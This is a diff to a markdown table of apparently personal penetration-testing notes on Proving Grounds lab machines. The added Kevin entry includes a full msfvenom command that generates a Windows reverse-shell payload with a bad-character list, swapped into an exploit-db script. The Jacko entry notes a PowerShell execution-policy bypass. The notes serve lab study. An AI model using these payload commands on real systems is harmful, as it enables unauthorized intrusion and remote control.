@@ -78,7 +78,7 @@
 |Internal |Easy | System running on windows server 2008 using smb port exploit tried with metasploit and and no luck ms09-050, after reverting also no response moving next one [blue](https://www.trenchesofit.com/2020/11/24/offensive-security-proving-grounds-internal-write-up-no-metasploit)
 [ms09-050](https://pentesting.zeyu2001.com/proving-grounds/warm-up/internal)|
 |Jacko |Intermediate |In the ports 80 running the H2 database, it redirects to port 8082 initially no accessabl revert then accessible their is login without password, their is version using exploitDB script, loggedin using the nc or Metasploit non-staged payload, their running PaperSteam IP, identified the version then find the exploit in exploitDB got the shell using powershell bypass worked first first time time ```powershell.exe -ep bypass exploit.ps1```used S1ren video  |
-|Kevin | | |
+|Kevin |Easy | Identified some ports no information with smb, nbtstart and port 80 running the GOAhead WebServer, with HP power manager, exploitdb 10099.py replaced the buffer with  msfvenom payload ``` msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=80 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed``` got admin access|
 |Resourced | | |
 |Squid | | |
 |DVR4 | | |
